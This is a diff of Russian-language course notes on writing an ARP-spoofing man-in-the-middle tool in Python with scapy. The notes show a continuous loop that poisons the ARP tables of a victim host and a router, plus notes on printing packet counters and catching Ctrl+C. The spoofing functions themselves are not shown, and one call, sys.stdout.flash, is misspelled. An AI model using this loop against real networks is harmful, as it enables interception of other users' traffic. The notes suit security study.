@@ -29,9 +29,66 @@
 
 		# код получения мак-адреса по ip
 
+	
+-----------
+	Для атаки arp-spoof необходимо отправлят пакеты непрерывно 
+	для, того чтобы жертва и роутер не успевали менять свою arp таблицу
 
+	import time # модуль для использования задержки
 
-
+	while True:
+		spoof("192.168.0.134", "192.168.0.1")
+		spoof("192.168.0.1", "192.168.0.134")
+		time.sleep(2) # задержка для бесконечного цикла
 
 	
+-----------
+
+	- scapy.send(packet, verbose=False) # отправляет собранный пакет
+		без ожидания ответа и без вывода вербальности
 	
+	sent_packet_count = 0
+	- print("Packets send:" + str(sent_packet_count))
+	# привидение целочисленного типа к строке
+
+
+-------ДИНАМИЧЕСКИЙ ВЫВОД----------
+			PYTHON 2.7
+
+	- print("Packets send:" + str(sent_packet_count)),
+		# при такой конструкции python направляет весь вывод в буфер 
+		но вывод не будет осуществляться, только после закрытия программы
+
+	import sys
+	- sys.stdout.flash() # функция сброса стандартного вывода, 
+		python2 не будет ждать завершения программы, чтобы вывести.
+		текст будет выводиться каждую итерацию 
+	
+	
+	- print("\rPackets send:" + str(sent_packet_count)),
+		# Для того, чтобы текст не выводился зачищая старый вывод
+		нужно использовать возврат каретки 
+
+
+
+-------ДИНАМИЧЕСКИЙ ВЫВОД----------
+			PYTHON 3
+
+	- print("\rPackets send:" + str(sent_packet_count), end="")
+		# вывод текста будет такой же, как в предыдущем примере
+
+
+
+--------__EXCEPTION__------------
+
+sent_packets_count = 0
+try:
+	while True:
+		spoof_ipmac_ip("192.168.0.134", mac_victim, "192.168.0.1")
+		spoof_ipmac_ip("192.168.0.1", mac_route, "192.168.0.134")
+		sent_packets_count = sent_packets_count + 2
+		print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+		time.sleep(2)
+except KeyboardInterrupt:
+		print("[+] Detected CTRL + C ......Quitting.")
+ 	
